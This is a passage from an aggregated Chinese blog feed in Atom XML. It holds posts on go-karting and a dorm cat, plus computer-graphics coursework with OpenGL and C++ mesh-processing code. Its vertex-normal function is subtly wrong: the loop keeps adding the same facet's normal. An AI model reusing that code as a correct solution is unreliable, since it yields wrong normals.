        <content type="text/html" src="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"><![CDATA[<p>本来打算拿纸做个架子把手机固定在帽子上全程拍摄<br>然而过弯力度太大手机左晃右晃最后还是甩了出去<br>就文字分享一下俊航卡丁车的体验吧<br>上车后工作人员发车发了好几次都没发着有点小尴尬<br>第一脚听到油门马达的轰鸣声立刻有种驾驭野兽的感觉<br>先不急第一圈模仿f1暖胎<br>在赛道上左右摇摆鲨鱼巡航<br>室内赛道长度较短但路面平整得甚至反光很适合漂移<br>车身很稳地摇完第一圈<br>第二圈开启运动模式<br>原谅我是个键盘车手油门只会踩到底<br>加速感超强入第一个弯前速度估计有30迈<br>减速 贴边 猛打方向盘 油门踩到底 方向盘反打<br>结果差点飘了180度<br>但还是不可避免的撞了路边轮胎<br>熟悉手感后就放开了<br>虽然地方小但弯道的布置很合理<br>漂移时skrskrskr~很刺激~<br>努力充分利用赛道感觉自己走线还可以~<br>我为车狂！！！</p><hr><p>一年前的12月，大寝有人从火锅店老板那里收了只幼猫，从此开始了有猫陪伴的日子。<br>如今猫咪已经不在，贴点照片和视频表达一下对它的想念。</p><iframe src="//player.bilibili.com/player.html?aid=35436376&cid=62120907&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe><p><img src="https://qiniu.karlrixon.cn/blog/181106/l7Eakg44il.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/mFfbFG81B7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/dl7LHkc4mj.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/fI83g5gcDB.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/cd0Kmd8igj.png?imageslim" alt="mark"></p><p>这张好丑233</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/d0LbeC0d43.png?imageslim" alt="mark"></p><p>台灯下就适合思考</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DHHk9LAKgf.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/J8L798EBda.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/Djem79cGa6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/2460HE0mfJ.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/EdCAhFh0Bh.png?imageslim" alt="mark"></p><p>尝试最舒服的睡姿。。</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/EeDAkDB6bc.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/8cFBhjj9Ac.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HGJ0gIK2bI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/aE8bf81maD.png?imageslim" alt="mark"></p><p>枕着算法书睡觉</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DIbjJ6Cjhk.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/deAFbCe92G.png?imageslim" alt="mark"></p><p>我是0排捷豹QAQ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/0kghK3mdKE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HIdB16aLb7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/4BBIk4L2CE.png?imageslim" alt="mark"></p><p>专心点！</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/jj036eiHGj.png?imageslim" alt="mark"></p><p>你愁啥</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bJ1iibhiCH.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DFLAIjKdjI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0alG7LB41h.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/h50ghHDb7a.png?imageslim" alt="mark"></p><p>这是老鼠吗</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/7khdeha147.png?imageslim" alt="mark"></p><p>老鼠就这味？</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/BD6H22j4Bi.png?imageslim" alt="mark"></p><p>你骗谁呢</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bklELf1b5K.png?imageslim" alt="mark"></p><p>悟空</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/Lb9162KEC6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0Ddb9CgJFb.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/m43dfK70cb.png?imageslim" alt="mark"></p><p>想你了喵</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/CHj5e6cEde.png?imageslim" alt="mark"></p>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/Todo-List/</id>
        <title><![CDATA[Todo List]]></title>
        <updated>2018-11-23T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/Todo-List/"/>
        <content type="text/html" src="https://doublemice.github.io/Todo-List/"><![CDATA[Todo List]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/The-road-to-linux-kernel-exploit/</id>
        <title><![CDATA[The Road To Linux Kernel Exploit]]></title>
        <updated>2018-11-22T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"/>
        <content type="text/html" src="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"><![CDATA[The Road To Linux Kernel Exploit]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/</id>
        <title><![CDATA[竞速游戏录屏剪辑]]></title>
        <updated>2018-11-11T11:07:14+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=27825157&cid=48041818&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/</id>
        <title><![CDATA[OpenGL设计小屋场景]]></title>
        <updated>2018-11-11T11:06:00+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"><![CDATA[<h2 id="Grading-Scheme"><a href="#Grading-Scheme" class="headerlink" title="Grading Scheme"></a>Grading Scheme</h2><p>Your assignment will be graded by the following marking scheme:<br>Basic (80%)</p><ul><li>Planes (the left, right, and back walls, the ceiling and the floor)  10%</li><li>At least five different geometric primitives                  20%</li><li>At least five keyboard events (mouse event is optional)        15%</li><li>Object transformation animation (rotation, translating, scaling)  15%</li><li>General lighting control (different material properties setting)   20%</li></ul><p>Bonus (Up to 20%)</p><ul><li>Well-organized room                                       5%</li><li>Complex meaningful object constructed by different primitives      5%</li><li>Additional light (with different properties, on/off or transformation)  10%</li><li>Other creativities                                           10%</li></ul><p>Total                                                       100%<br>Note: No grade will be given if the program is incomplete.</p><h2 id="代码框架解读"><a href="#代码框架解读" class="headerlink" title="代码框架解读"></a>代码框架解读</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;GL/glut.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> GLdouble FRUSTDIM = <span class="number">100.0f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// All Setup For OpenGL Goes Here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glEnable(GL_DEPTH_TEST);</span><br><span class="line">glEnable(GL_LIGHTING);</span><br><span class="line">glEnable(GL_LIGHT0);</span><br><span class="line">glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// Here's Where We Do All The Drawing</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Place light source here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Draw walls and objects here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Add animation here</span></span><br><span class="line"></span><br><span class="line">glutSwapBuffers();</span><br><span class="line">glFlush();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reshape</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> h)</span> <span class="comment">// Resize the GL Window. w=width, h=height</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glViewport(<span class="number">0</span>, <span class="number">0</span>, (GLsizei) w, (GLsizei) h);</span><br><span class="line">glMatrixMode(GL_PROJECTION);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">glFrustum(-FRUSTDIM, FRUSTDIM, -FRUSTDIM, FRUSTDIM, <span class="number">320.</span>, <span class="number">640.</span>);</span><br><span class="line">glMatrixMode(GL_MODELVIEW);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">keyboard</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> key, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> <span class="comment">// Handle the keyboard events here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> (key) </span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span>'\<span class="number">033'</span>:<span class="comment">//press 'esc' to quit</span></span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">   <span class="comment">// Add keyboard control here</span></span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Initialization of GLUT Library */</span></span><br><span class="line">glutInit(&amp;argc, argv);</span><br><span class="line">glutInitDisplayMode(GLUT_RGBA|GLUT_DOUBLE|GLUT_DEPTH);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Create a window with title specified */</span></span><br><span class="line">glutCreateWindow(<span class="string">"Assignment 1"</span>);</span><br><span class="line">glutInitWindowSize(<span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">glutInitWindowPosition(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">init();<span class="comment">/*not GLUT call, initialize several parameters */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Register different CALLBACK function for GLUT to response </span></span><br><span class="line"><span class="comment">with different events, e.g. window sizing, mouse click or</span></span><br><span class="line"><span class="comment">keyboard stroke */</span></span><br><span class="line">glutReshapeFunc(reshape);</span><br><span class="line">glutDisplayFunc(display);</span><br><span class="line">glutKeyboardFunc(keyboard);</span><br><span class="line">glutIdleFunc(idle);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Enter the GLUT event processing loop which never returns.</span></span><br><span class="line"><span class="comment">it will call different registered CALLBACK according</span></span><br><span class="line"><span class="comment">to different events. */</span></span><br><span class="line">glutMainLoop();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改和补充"><a href="#修改和补充" class="headerlink" title="修改和补充"></a>修改和补充</h2><p>作业框架中的一处bug：<code>main</code>函数中<code>glutCreateWindow</code>应当在<code>glutInitWindowSize</code>和<code>glutInitWindowPosition</code>之后。</p><p>在init函数中添加<code>glEnable(GL_NORMALIZE);</code>，<code>glEnable(GL_NORMALIZE)</code>是使<code>opengl</code>自动normalize 法向量，之所以需要自动normalize 法向量是因为法向量会受到<code>glScalef</code>的影响，当<code>glScalef</code>将物体的坐标放大k倍时，法向量变为1/k，因为opengl自己的光照计算要求法向量单位化，所以不重新单位化，计算结果就是错误的。<br>举个例子就是如果不添加<code>glEnable(GL_NORMALIZE);</code>在<code>display</code>函数中放大一个几何物体它的亮度就会变暗。</p><p>在<code>display</code>函数中添加<code>glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</code>用于清除缓冲区。</p><p>在<code>display</code>函数中所有代码外套一个<code>glPushMatrix();</code>和<code>glPopMatrix();</code>保证每次回调时的矩阵栈为空。</p><h2 id="程序一：动画效果演示"><a href="#程序一：动画效果演示" class="headerlink" title="程序一：动画效果演示"></a>程序一：动画效果演示</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/%E4%BD%9C%E4%B8%9A%E4%B8%80/%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C" target="_blank" rel="noopener">源码</a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/0bFl5AJ2L5.png?imageslim" alt="mark"></p><h2 id="程序二：3D-room-scene"><a href="#程序二：3D-room-scene" class="headerlink" title="程序二：3D room scene"></a>程序二：3D room scene</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/作业一/房间设计" target="_blank" rel="noopener">源码</a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/h4G05EK5Cb.png?imageslim" alt="mark"></p><iframe src="//player.bilibili.com/player.html?aid=34258956&cid=60010777&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/</id>
        <title><![CDATA[计算机图形学finalal_project:MeshViewer]]></title>
        <updated>2018-11-09T12:03:21+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"><![CDATA[<h2 id="代码解读"><a href="#代码解读" class="headerlink" title="代码解读"></a>代码解读</h2><p>a.首先从<code>meshviewer.cpp</code>看起，里面包含main函数入口，打印使用说明，设置窗口信息，初始化灯光材质等信息，创建菜单，绘制图像，窗口大小变化回调，鼠标点击和移动回调，默认回调，键盘回调，网格模型处理，主循环</p><p>b.然后要读懂的是<code>MeshInterface.h</code>文件，包含网格模型处理的操作，了解<code>glNewList</code>和<code>glCallList</code></p><p>c.接着看内核头文件，<code>Kernal.h</code>和<code>ExKernal.h</code>里包含了所有后面写代码要用到的函数声明，<code>Kernal.h</code>中要注意的是何种半边句柄的转换函数，<code>ExKernal.h</code>中的高级功能函数需要了解</p><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>a.其中1. 2. 4. 5的函数声明在 mesh/extension/ExKernelT.h (截图如下)<br>函数实现请在mesh/extension/ExkernelT.cpp 中完成 (务必)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/ie20LdjLk0.png?imageslim" alt="mark"></p><p>b.其中3的函数声明在read_write/read_write.h<br>函数实现请在read_write/read_write.cpp 中完成 (务必)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/JmeG2b7D19.png?imageslim" alt="mark"></p><p>c.请把整个代码看明白，里面实现了各种基本操作，例如求三角网格中每个三角形的重心、求每个三角面片的法向等等。</p><p>d.程序运行截图如下：</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/eaf9Ghl9AG.png?imageslim" alt="mark"></p><p>e.鼠标点击右键，会出现一个操作界面，里面有一些灯光和其他绘制效果。</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/Gga208dGIg.png?imageslim" alt="mark"></p><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><blockquote><p>计算三角网格中每个三角形(face)的面积；10分</p></blockquote><p>此函数声明为： Scalar calc_facet_area(const FacetHandle&amp; _fh); //给定一个三角面片，计算它的面积<br>Tips: 可以根据程序输出结果判定是否计算正确，例如，输入模型cow.off，它的所有三角面片中，面积最大的三角面片的面积为：The maximal area of the mesh is: 0.0494426</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Scalar</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_facet_area(<span class="keyword">const</span> FacetHandle&amp; _fh)&#123;<span class="comment">/////计算三角形的面积</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">///得到半边句柄</span></span><br><span class="line">    HalfedgeHandle&amp; hh1 = halfedge_handle(_fh);</span><br><span class="line">    HalfedgeHandle&amp; hh2 = next_halfedge_handle(hh1);</span><br><span class="line">    HalfedgeHandle&amp; hh3 = next_halfedge_handle(hh2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////由半边句柄得到边句柄</span></span><br><span class="line">    EdgeHandle&amp; eh1 = edge_handle(hh1);</span><br><span class="line">    EdgeHandle&amp; eh2 = edge_handle(hh2);</span><br><span class="line">    EdgeHandle&amp; eh3 = edge_handle(hh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////由边句柄得到各边长</span></span><br><span class="line">    <span class="keyword">float</span> a = calc_edge_length(eh1);</span><br><span class="line">    <span class="keyword">float</span> b = calc_edge_length(eh2);</span><br><span class="line">    <span class="keyword">float</span> c = calc_edge_length(eh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////利用海伦公式求面积s=sqrt(p(p-a)(p-b)(p-c))</span></span><br><span class="line">    Scalar area = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> p = (a + b + c) / <span class="number">2</span>;</span><br><span class="line">    area = <span class="built_in">sqrt</span>(p*(p - a)*(p - b)*(p - c));</span><br><span class="line"></span><br><span class="line">    facet_ref(_fh).area_ = area;</span><br><span class="line">    <span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/d8DIbDC712.png?imageslim" alt="mark"></p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><blockquote><p>计算三角网格中每个顶点(vertex) 的法向；20分</p></blockquote><p>此函数声明为：inline Normal calc_normal(const VertexHandle&amp; _vh);///计算顶点的法向值<br>Tips: 注意归一化。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Normal</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_normal(<span class="keyword">const</span> VertexHandle&amp; _vh) &#123;<span class="comment">////更新一个顶点的法向</span></span><br><span class="line">    assert( _vh.is_valid());</span><br><span class="line">    assert( _vh.idx() &lt; vertex_size() );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Normal          norm(1,1,1);///////用norm存储求得的法向值</span></span><br><span class="line">    <span class="function">Normal          <span class="title">norm</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////在此实现////////////////////////////////////</span></span><br><span class="line">    HalfedgeHandle firstHH = halfedge_handle(_vh);</span><br><span class="line">    FacetHandle fh = facet_handle(firstHH);</span><br><span class="line">    norm = norm + calc_normal(fh);</span><br><span class="line">    HalfedgeHandle hh = opposite_halfedge_handle(next_halfedge_handle(firstHH));</span><br><span class="line">    <span class="keyword">while</span> (hh != firstHH) &#123;</span><br><span class="line">      norm = norm + calc_normal(fh);</span><br><span class="line">      hh = opposite_halfedge_handle(next_halfedge_handle(hh));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> norm.normalize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><blockquote><p>用OpenGL把三角网格中每个三角面片(face)的法向画出来（提示：在每个三角面片的重心处画）；20分</p></blockquote><p>此函数声明为：bool ogl_writer2(bool _orient = true, bool _smooth = false);<br>Tips: 可以参照函数bool ogl_writer(bool  _orient = true, bool _smooth = false)的来实现，这时只需要在每个三角面片中画出法向即可（法向用Line表示。按键盘上”m”可以查看画出面片法向后的结果。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Mesh</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">ReaderWriterT</span>&lt;Mesh&gt;:</span>:ogl_writer2(<span class="keyword">bool</span> _orient, <span class="keyword">bool</span> _smooth)&#123;<span class="comment">////在里面把三角面片法向画出</span></span><br><span class="line">  HalfedgeHandle       cshh;</span><br><span class="line">  Mesh::FacetIterator  fit(mesh_-&gt;facet_begin());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//glShadeModel(GL_FLAT);</span></span><br><span class="line">    glShadeModel(GL_SMOOTH);</span><br><span class="line">    <span class="keyword">int</span> orient = <span class="literal">true</span>;<span class="comment">// (_orient) ? 1 : -1; </span></span><br><span class="line">    mesh_-&gt;update_normals();<span class="comment">//计算面法向和点法向</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; fit != mesh_-&gt;facet_end(); ++fit) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((*fit).status_.is_deleted()) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      cshh = fit-&gt;halfedge_handle_;</span><br><span class="line">      FacetHandle fh = mesh_-&gt;facet_handle(cshh);</span><br><span class="line">      <span class="keyword">const</span> VertexHandle&amp; vh0 = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line">      glColor3f(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">      glBegin(GL_LINES);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> VertexHandle&amp; vh = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//glNormal3fv(mesh_-&gt;normal(fh)*orient);</span></span><br><span class="line">        <span class="comment">//glVertex3fv(mesh_-&gt;coord(vh));</span></span><br><span class="line">        cshh = mesh_-&gt;next_halfedge_handle(cshh);</span><br><span class="line">        </span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh));</span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh) + mesh_-&gt;normal(fh));</span><br><span class="line">      &#125; <span class="keyword">while</span> (cshh != fit-&gt;halfedge_handle_);</span><br><span class="line">      glEnd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下:</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/3FF0CJmga7.png?imageslim" alt="mark">  </p><h2 id="task4"><a href="#task4" class="headerlink" 